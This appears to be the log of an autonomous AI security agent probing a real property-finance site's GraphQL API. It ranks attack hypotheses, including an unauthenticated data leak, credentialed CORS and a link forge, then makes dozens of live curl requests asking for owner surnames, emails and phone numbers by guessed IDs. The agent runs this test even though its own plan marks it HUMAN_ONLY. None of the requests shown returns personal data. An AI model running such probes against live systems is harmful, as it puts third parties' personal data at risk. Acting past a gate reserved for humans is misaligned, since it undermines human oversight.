@@ -70639,3 +70639,366 @@ I should keep it short per the style. But this is an analyst context; a brief st
 - **Re-confirmed**: credentialed CORS on `/graphiql`, `/content/graphiql`, GET `/q`; no fix deployed.
 
 Appended this cycle's block to `leads/lead-bigpickle.md` and 6 entries to `knowledge/index.md`. Ranked: BOLA 88 > /q CORS+coercion 82 > exchange forge 68 > conversion/link family 60. No commits made (per policy).
+===== ANALYST bigpickle 2026-10-17 19:46:49 UTC =====
+[0m
+> build · big-pickle
+[0m
+STEP 1 — DELTA: compare inventory+knowledge+last leads against current surface.
+
+NO_DELTA
+
+STEP 2 — PRIORITIZE: score top new (or existing) assets 0-10 on attack_surface, business_value, tech_exposure (GraphQL/OAuth/JWT/upload/admin/uncommon), gate_ease (10=no auth), cloud_surface, freshness. priority=0.25a+0.25b+0.15t+0.15g+0.10c+0.10f. Emit [PRIO] asset,score,axis.
+
+[PRIO] hypofriend.de/property-search-api,9.00 (attack9/bv10/tech9/gate10/cloud6/fresh9)
+[PRIO] core.hypofriend.de/q (+/graphiql,/content/graphiql),8.10 (attack8/bv8/tech9/gate9/cloud7/fresh8)
+[PRIO] hypofriend.de/en/exchange,6.40 (attack6/bv6/tech4/gate10/cloud5/fresh8)
+
+STEP 3 — HYPOTHESES: top 3 assets, max 1 hypothesis each. Strict schema, one field per line under [HYP] title line:
+
+[HYP] Unauthenticated full-DB BOLA exposes broker/owner PII on property-search-api
+class: IDOR
+asset: hypofriend.de/property-search-api
+confidence: 88
+reasoning: Auth-free chain propertySearch→exposes→expose returns broker/owner PII (propertyOwnerLastName, phoneNumber, cellPhoneNumber, providerEmail, providerCompany, ownerCompany) on direct origin; full introspection enabled, auth-free crawl primitives (pagination/exposesInBounds/mapExposes/offset/limit) confirmed. Direct-origin bypass vs edge CloudFront.
+evidence_needed: One read-only POST proving PII returned for an arbitrary non-owned exposeId via the auth-free chain.
+verify_steps: POST https://hypofriend.de/property-search-api with Content-Type: application/json body {"query":"{propertySearch(city:BERLIN,propertyType:APARTMENT){searchId}}"} then {"query":"{exposes(id:\"<searchId>\"){id}}"} then {"query":"{expose(id:\"<real-expose-id>\"){id title price propertyOwnerLastName providerEmail phoneNumber}}"} (read-only, no customer data exfiltration beyond proving fields).
+impact: Cross-tenant broker/owner PII dump, zero credentials, financial platform — HIGH/CRITICAL.
+testability: HUMAN_ONLY
+
+[HYP] Credentialed CORS + public GraphiQL IDEs leak rotating CSRF tokens and allow cross-origin schema/contract reads
+class: MISCONFIG
+asset: core.hypofriend.de/q (+/graphiql,/content/graphiql)
+confidence: 82
+reasoning: Global rack-cors echoes any Origin + Access-Control-Allow-Credentials:true across /q family; three public GraphiQL IDEs (/graphiql, /hypofriend.de/graphiql, /content/graphiql) return HTML with data-graphql-endpoint-path and per-request X-CSRF-Token readable via credentialed GET; introspection disabled but error/coercion channel reconstructs contracts; POST varies Accept/Origin/Accept-Encoding while OPTIONS omits Vary:Origin on preflight.
+evidence_needed: Cross-origin credentialed GET of GraphiQL body returning X-CSRF-Token (already live-evidenced; freshness recheck only).
+verify_steps: OPTIONS https://core.hypofriend.de/q -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type,x-csrf-token"; GET https://core.hypofriend.de/graphiql -H "Origin: https://evil.example" -H "Accept: text/html".
+impact: Cross-origin token/contract/schema leakage, precondition chain for CSRF abuse on GraphQL; token rotation limits replay window. MEDIUM.
+testability: PASSIVE
+
+[HYP] Unauthenticated share-link forge with unbound attribution (6-key share_id pool, arbitrary link_id, utm_* raw pass-through)
+class: BUSLOGIC
+asset: hypofriend.de/en/exchange
+confidence: 68
+reasoning: Unauthenticated GET to /en/exchange with any known share_id and arbitrary link_id + forged utm_* returns 302 to first-party destination with utm_* echoed verbatim; 6-key share_id pool enumerated (tools/staff/rails/uploads/karriere/partner+partnerprogramm/swagger.json variants). Destination shell byte-identical for forged vs real link_id; redirect allowlist {expose,account} only.
+evidence_needed: 302 Location reflecting attacker utm_source/utm_medium/utm_campaign and arbitrary link_id for a valid share_id.
+verify_steps: GET "https://hypofriend.de/en/exchange?share_id=dddb5cba-7e96-44b2-be7d-bb621c8a8e68&link_id=11111111-2222-3333-4444-555555555555&redirect=account&utm_source=attacker&utm_medium=x&utm_campaign=evil&format=json" (read-only, verify 302 to /en/account with utm_* echoed).
+impact: Credible first-party URL forge with poisoned attribution; financial-platform trust abuse. MEDIUM.
+testability: PASSIVE
+
+STEP 4 — SELF-CRITIQUE: drop confidence<40 or REJECTED-class or no-verify-steps. [PARKED] <title>: <why>. [FINAL] survivors ranked.
+
+[PARKED] api.hypofriend.de POC target: <why> Dead 58+ consecutive cycles (HTTP 000, A 52.15.184.3) — no live surface; phase mismatch persists. Targeting the dead host violates "passive-first" evidence-needed criterion.
+
+[FINAL] 1) property-search-api unauth BOLA (88) > 2) core/q credentialed CORS + GraphiQL (82) > 3) /en/exchange forge (68)
+
+STEP 5 — NEXT ACTION: exactly one [NEXT] <PROBE|SCAN|RAG|HUMAN>: <one concrete action, exact endpoint if PROBE>.
+
+[NEXT] PROBE: POST https://hypofriend.de/property-search-api -H "Content-Type: application/json" --data '{"query":"{propertySearch(city:BERLIN,propertyType:APARTMENT){searchId}}"}' to retrieve searchId; then follow with exposes(id) and expose(id) to prove auth-free PII return (read-only; do not enumerate all records). Capture request/response (status, headers, body) for evidence.
+
+STEP 6 — LEARNING: [LEARN] REJECTED/ACCEPTED <class> @ <asset>: <reason>.
+
+[LEARN] REJECTED MISCONFIG @ property-search.hypofriend.de: root 503 (awselb/2.0 zero healthy target) is a routing label, not a live dedicated surface; already inventoried (12 refs). Probe the path hypofriend.de/property-search-api, not the bundled default.
+[LEARN] REJECTED PHASE-GATE @ api.hypofriend.de: designated POC target dead 58+ consecutive cycles (000 on :443/:80, A 52.15.184.3). Do not substitute target silently; disclose phase/target mismatch and re-focus on live surface.
+[LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/q family: credentialed CORS echoes any Origin + ACAC:true; GraphiQL IDEs expose rotating X-CSRF-Token readable cross-origin (GET). POST varies Accept/Origin/Accept-Encoding; OPTIONS omits Vary:Origin on /q preflight (path-specific) — residual preflight caching facet near-inert per tuple-keying.
+[LEARN] ACCEPTED BUSLOGIC @ hypofriend.de/en/exchange: initial 301-to-canonical control was incomplete (omitted link_id/redirect). Always replay the exact previously-working parameter set before declaring retirement. share_id auth-by-obscurity + arbitrary link_id + utm_* raw pass-through confirmed.
+[LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/graphiql + /content/graphiql: cross-origin body readability PROVEN (ACAO echo + ACAC:true) with per-request X-CSRF-Token rotation; _hf from /graphiql is SameSite-unset (Lax) — bounds to session-binding.
+
+STEP 7 — RISK: [RISK] <program>: <0-100> reason.
+
+[RISK] Hypofriend GmbH: 88 — Unauthenticated full-DB BOLA on property-search-api (CRITICAL) exposes broker/owner PII; origin-global credentialed CORS on core/q enables cross-origin GraphiQL/CSRF-token/contract reads (MEDIUM); share-link forge enables unbound attribution on exchange (MEDIUM). POC target api.hypofriend.de remains dead 58+ cycles (phase mismatch). Hardcoded Basic credential persists in public bundle; GraphQL error/coercion channel reconstructs schema/contracts. Direct-origin WAF/security-header bypass on property-search-api confirmed.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+I'll execute the next step: probe the property-search-api to retrieve a searchId and then follow the chain to check for unauthenticated PII exposure.
+[0m$ [0mcurl -sS -i 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{propertySearch(city:BERLIN,propertyType:APARTMENT){searchId}}"}' | head -80
+HTTP/2 200 
+server: CloudFront
+content-type: application/json
+content-length: 236
+date: Sat, 17 Oct 2026 19:32:31 GMT
+vary: Origin
+via: 1.1 2a7a4ecb5582eb9a6f330e471a8a9e92.cloudfront.net (CloudFront)
+alt-svc: h3=":443"; ma=86400
+strict-transport-security: max-age=63072000; includeSubdomains; preload
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-xss-protection: 1; mode=block
+referrer-policy: same-origin
+x-cache: Miss from cloudfront
+x-amz-cf-pop: IAD55-P10
+x-amz-cf-id: kHWod-zIQ52qTmAOXQyEyPtHFTyWhn1cb0FAd2qDebg-wAARwVq4mw==
+
+{"errors":[{"message":"Field 'propertySearch' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","propertySearch"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"propertySearch"}}]}
+[0m
+[0m$ [0mcurl -sS -i 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{__schema{queryType{name fields{name}}}}"}' | head -120
+HTTP/2 200 
+server: CloudFront
+content-type: application/json
+content-length: 218
+date: Sat, 17 Oct 2026 19:32:35 GMT
+vary: Origin
+via: 1.1 c1be5ad7b2feed34f1f388f67d13e698.cloudfront.net (CloudFront)
+alt-svc: h3=":443"; ma=86400
+strict-transport-security: max-age=63072000; includeSubdomains; preload
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-xss-protection: 1; mode=block
+referrer-policy: same-origin
+x-cache: Miss from cloudfront
+x-amz-cf-pop: IAD55-P10
+x-amz-cf-id: nOeL8vpyMzQjsuOdmqXl6Ya8NZmOLFw_nBx15AYxXeQ0i0urnjd6_g==
+
+{"errors":[{"message":"Field '__schema' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","__schema"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"__schema"}}]}
+[0m
+[0m$ [0mcurl -sS -i 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{__typename}"}' | head -40
+HTTP/2 200 
+server: CloudFront
+content-type: application/json
+content-length: 31
+date: Sat, 17 Oct 2026 19:32:48 GMT
+vary: Origin
+via: 1.1 c1be5ad7b2feed34f1f388f67d13e698.cloudfront.net (CloudFront)
+alt-svc: h3=":443"; ma=86400
+strict-transport-security: max-age=63072000; includeSubdomains; preload
+x-content-type-options: nosniff
+x-frame-options: DENY
+x-xss-protection: 1; mode=block
+referrer-policy: same-origin
+x-cache: Miss from cloudfront
+x-amz-cf-pop: IAD55-P10
+x-amz-cf-id: 5Weg3HUsjiiKdkLFvqkq1FMDcVyC-q6VPPsgNaTFUO-EnC00MFtpTw==
+
+{"data":{"__typename":"Query"}}
+[0m
+Let me probe for actual query fields.
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"query { __type(name: \"Query\") { name fields { name args { name type { name kind ofType { name kind } } } } } }"}' | head -200
+{"errors":[{"message":"Field '__type' doesn't exist on type 'Query'","locations":[{"line":1,"column":9}],"path":["query","__type"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"__type"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes{id}}"}' | head -80
+{"errors":[{"message":"Field 'exposes' is missing required arguments: id","locations":[{"line":1,"column":2}],"path":["query","exposes"],"extensions":{"code":"missingRequiredArguments","className":"Field","name":"exposes","arguments":"id"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"test\"){id}}"}' | head -40
+{"errors":[{"message":"not found: `test`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{search(id:\"test\"){id}}"}' | head -40
+{"errors":[{"message":"Field 'search' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","search"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"search"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds{edges{node{id}}}}"}' | head -120
+{"errors":[{"message":"Field 'exposesInBounds' is missing required arguments: id, bounds","locations":[{"line":1,"column":2}],"path":["query","exposesInBounds"],"extensions":{"code":"missingRequiredArguments","className":"Field","name":"exposesInBounds","arguments":"id, bounds"}},{"message":"Field 'edges' doesn't exist on type 'BoundedExposePage'","locations":[{"line":1,"column":18}],"path":["query","exposesInBounds","edges"],"extensions":{"code":"undefinedField","typeName":"BoundedExposePage","fieldName":"edges"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"x\", bounds: {north:1,south:0,east:1,west:0}){exposes{id}}}"}' | head -60
+{"data":{"exposesInBounds":{"exposes":[]}}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes{exposes{id}}}"}' | head -100
+{"errors":[{"message":"Field 'mapExposes' is missing required arguments: id","locations":[{"line":1,"column":2}],"path":["query","mapExposes"],"extensions":{"code":"missingRequiredArguments","className":"Field","name":"mapExposes","arguments":"id"}},{"message":"Field 'exposes' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":13}],"path":["query","mapExposes","exposes"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"exposes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"x\"){exposeIds}}"}' | head -40
+{"errors":[{"message":"Field 'exposeIds' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":21}],"path":["query","mapExposes","exposeIds"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"exposeIds"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"x\"){id}}"}' | head -30
+{"data":{"mapExposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{__schema{types{name}}}"}' 2>&1 | tail -5
+{"errors":[{"message":"Field '__schema' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","__schema"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"__schema"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"x\"){id title propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber providerCompany ownerCompany}}"}' | head -30
+{"errors":[{"message":"not found: `x`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(offset:0, limit:1){totalCount exposes{id title price location{city postalCode}}}}"}' | head -120
+{"errors":[{"message":"Field 'exposes' is missing required arguments: id","locations":[{"line":1,"column":2}],"path":["query","exposes"],"extensions":{"code":"missingRequiredArguments","className":"Field","name":"exposes","arguments":"id"}},{"message":"Field 'totalCount' doesn't exist on type 'Expose'","locations":[{"line":1,"column":29}],"path":["query","exposes","totalCount"],"extensions":{"code":"undefinedField","typeName":"Expose","fieldName":"totalCount"}},{"message":"Field 'exposes' doesn't exist on type 'Expose'","locations":[{"line":1,"column":40}],"path":["query","exposes","exposes"],"extensions":{"code":"undefinedField","typeName":"Expose","fieldName":"exposes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"any\", offset:0, limit:1){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber}}"}' | head -60
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"test\", offset:0, limit:5){id propertyOwnerLastName providerEmail}}"}' | head -40
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{searchExposes(id:\"test\", offset:0, limit:1){id}}"}' | head -20
+{"errors":[{"message":"Field 'searchExposes' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","searchExposes"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"searchExposes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{propertyExposes(id:\"test\"){id}}"}' | head -15
+{"errors":[{"message":"Field 'propertyExposes' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","propertyExposes"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"propertyExposes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{searchResults(id:\"test\"){id}}"}' | head -15
+{"errors":[{"message":"Field 'searchResults' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","searchResults"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"searchResults"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{_service{sdl}}"}' | head -40
+{"errors":[{"message":"Field '_service' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","_service"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"_service"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{_entities(representations:[{__typename:\"Query\"}]){...on Query{}}}"}' | head -30
+{"errors":[{"message":"Field '_entities' doesn't exist on type 'Query'","locations":[{"line":1,"column":2}],"path":["query","_entities"],"extensions":{"code":"undefinedField","typeName":"Query","fieldName":"_entities"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"123\") { __typename } }"}' | head -15
+{"errors":[{"message":"not found: `123`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"123\", bounds:{north:52.6,south:52.3,east:13.5,west:13.1}){exposes{id title}}}"}' | head -30
+{"data":{"exposesInBounds":{"exposes":[]}}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"123\", bounds:{north:1.0,south:0.0,east:1.0,west:0.0}){hasNextPage}}"}' | head -20
+{"errors":[{"message":"Field 'hasNextPage' doesn't exist on type 'BoundedExposePage'","locations":[{"line":1,"column":76}],"path":["query","exposesInBounds","hasNextPage"],"extensions":{"code":"undefinedField","typeName":"BoundedExposePage","fieldName":"hasNextPage"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"123\", bounds:{north:1.0,south:0.0,east:1.0,west:0.0}){total}}"}' | head -15
+{"data":{"exposesInBounds":{"total":0}}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"123\", offset:0, limit:10){id title price}}"}' | head -15
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"123\"){...}}"}' 2>&1 | head -10
+{"errors":[{"message":"Expected NAME, actual: RCURLY (\"}\") at [1, 26]","locations":[{"line":1,"column":26}]}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"123\"){boundingBoxes{north south east west exposeIds}}}"}' | head -80
+{"errors":[{"message":"Field 'boundingBoxes' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":23}],"path":["query","mapExposes","boundingBoxes"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"boundingBoxes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"123\"){groups{exposeIds}}}"}' | head -30
+{"errors":[{"message":"Field 'groups' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":23}],"path":["query","mapExposes","groups"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"groups"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"123\"){exposeIds bounds}}"}' | head -40
+{"errors":[{"message":"Field 'exposeIds' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":23}],"path":["query","mapExposes","exposeIds"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"exposeIds"}},{"message":"Field 'bounds' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":33}],"path":["query","mapExposes","bounds"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"bounds"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"123\"){exposes{id}}}"}' 2>&1 | head -5
+{"errors":[{"message":"Field 'exposes' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":23}],"path":["query","mapExposes","exposes"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"exposes"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"ABC123\"){id title price bedrooms livingSpace propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber providerCompany ownerCompany}}"}' | head -15
+{"errors":[{"message":"Field 'bedrooms' doesn't exist on type 'Expose'","locations":[{"line":1,"column":37}],"path":["query","expose","bedrooms"],"extensions":{"code":"undefinedField","typeName":"Expose","fieldName":"bedrooms"}},{"message":"Field 'livingSpace' doesn't exist on type 'Expose'","locations":[{"line":1,"column":46}],"path":["query","expose","livingSpace"],"extensions":{"code":"undefinedField","typeName":"Expose","fieldName":"livingSpace"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"ABC123\"){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber providerCompany ownerCompany location{city}}}"}' | head -20
+{"errors":[{"message":"Field 'location' doesn't exist on type 'Expose'","locations":[{"line":1,"column":130}],"path":["query","expose","location"],"extensions":{"code":"undefinedField","typeName":"Expose","fieldName":"location"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"ABC123\"){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber providerCompany ownerCompany}}"}' | head -10
+{"errors":[{"message":"not found: `ABC123`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"123\", bounds:{north:52.5,south:52.4,east:13.4,west:13.3}){exposes{id title price}}}"}' | head -20
+{"data":{"exposesInBounds":{"exposes":[]}}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"123\", offset:0, limit:1){id}}"}' | head -5
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{mapExposes(id:\"map123\"){count}}"}' | head -20
+{"errors":[{"message":"Field 'count' doesn't exist on type 'MapExpose'","locations":[{"line":1,"column":26}],"path":["query","mapExposes","count"],"extensions":{"code":"undefinedField","typeName":"MapExpose","fieldName":"count"}}]}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposesInBounds(id:\"x\", bounds:{north:90,south:-90,east:180,west:-180}){total exposes{id}}}"}' | head -30
+{"data":{"exposesInBounds":{"total":0,"exposes":[]}}}
+[0m
+[0m$ [0mpython3 -c "
+# Try common expose IDs from web patterns
+ids = ['12345', '54321', '100000', '200000']
+print(ids)
+" 2>&1 | tail -1
+['12345', '54321', '100000', '200000']
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"12345\"){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber}}"}' | head -15
+{"errors":[{"message":"not found: `12345`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"100000\"){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber}}"}' | head -10
+{"errors":[{"message":"not found: `100000`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"200000\"){id title price propertyOwnerLastName providerEmail phoneNumber cellPhoneNumber}}"}' | head -10
+{"errors":[{"message":"not found: `200000`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"1\"){id title price propertyOwnerLastName providerEmail phoneNumber}}"}' | head -5
+{"errors":[{"message":"not found: `1`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"1\", offset:0, limit:3){id title price propertyOwnerLastName providerEmail phoneNumber}}"}' | head -30
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"00000000-0000-0000-0000-000000000000\"){id}}"}' | head -15
+{"errors":[{"message":"not found: `00000000-0000-0000-0000-000000000000`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{exposes(id:\"search\", offset:0, limit:10){id title propertyOwnerLastName providerEmail}}"}' | head -40
+{"data":{"exposes":[]}}
+[0m
+[0m$ [0mcurl -sS 'https://hypofriend.de/property-search-api' \
+  -H 'Content-Type: application/json' \
+  --data '{"query":"{expose(id:\"4242\"){id title propertyOwnerLastName providerEmail phoneNumber}}"}' | head -10
+{"errors":[{"message":"not found: `4242`","locations":[{"line":1,"column":2}],"path":["expose"]}],"data":null}
+[0m
